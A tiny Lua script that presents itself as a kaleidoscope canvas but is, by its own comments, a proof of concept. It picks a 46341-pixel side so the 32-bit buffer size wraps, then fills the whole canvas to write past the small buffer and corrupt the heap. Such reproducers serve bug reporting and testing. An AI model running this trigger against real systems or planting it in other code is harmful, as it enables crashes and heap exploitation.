-- Kaleido: a generative kaleidoscope canvas.
-- A side of 46341 makes width times height times two bytes per pixel overflow
-- the 32 bit size and wrap to a tiny buffer, while the canvas still believes
-- it is enormous.
local SIDE = 46341
canvas.create(0, 0, SIDE, SIDE)
canvas.clear(0x101018)
-- This fill writes far past the tiny buffer and corrupts the heap.
canvas.draw_rect(0, 0, SIDE, SIDE, 0xFF2BD6)
